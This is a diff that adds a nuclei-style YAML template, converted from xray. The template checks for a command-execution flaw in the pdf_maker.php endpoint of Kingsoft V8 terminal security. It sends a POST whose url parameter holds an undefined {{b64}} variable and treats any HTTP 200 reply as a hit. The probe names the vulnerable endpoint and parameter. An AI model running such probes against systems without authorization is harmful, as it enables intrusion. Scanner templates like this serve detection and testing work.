@@ -1,0 +1,24 @@
+id: poc-yaml-kingsoft-zdv8-pdf-maker-php-rce
+
+info:
+  name: poc-yaml-kingsoft-zdv8-pdf-maker-php-rce
+  author: chaitin
+  severity: medium
+  tags: xray-converted,rce
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20pdf_maker.php%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        POST /inter/pdf_maker.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        url={{b64}}&fileName=xxx
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
